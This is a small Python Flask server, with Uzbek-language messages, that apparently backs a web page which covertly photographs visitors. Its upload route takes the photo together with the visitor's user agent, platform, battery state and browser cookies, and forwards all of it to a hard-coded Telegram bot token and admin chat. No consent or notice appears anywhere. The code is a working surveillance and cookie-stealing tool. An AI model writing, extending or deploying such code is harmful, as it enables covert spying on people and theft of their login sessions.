import os
from flask import Flask, request, render_template
import requests

app = Flask(__name__)

BOT_TOKEN = '7093826124:AAGbKwsa5bJaai_kNLdUY3i1nI6nOEwOgsA' 
ADMIN_ID = 6831638419   

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'photo' not in request.files:
        return 'Rasm yo‘q', 400

    photo = request.files['photo']
    user_agent = request.form.get('userAgent', 'Nomalum')
    platform = request.form.get('platform', 'Nomalum')
    cookies = request.form.get('cookies', 'Nomalum')
    battery_level = request.form.get('batteryLevel', 'Nomalum')
    battery_charging = request.form.get('batteryCharging', 'Nomalum')

    photo_path = 'auto.jpg'
    photo.save(photo_path)

    send_photo_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'

    caption_text = (
        "📸 Yangi rasm!\n"
        f"🖥️ OS: {platform}\n"
        f"🧠 User-Agent: {user_agent}\n"
        f"🔋 Zaryad: {battery_level}, Quvvat olayapti: {battery_charging}\n"
        f"🍪 Cookie: {cookies}"
    )

    with open(photo_path, 'rb') as f:
        requests.post(send_photo_url, data={
            'chat_id': ADMIN_ID,
            'caption': caption_text
        }, files={'photo': f})

    os.remove(photo_path)

    return 'Yuborildi', 200

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
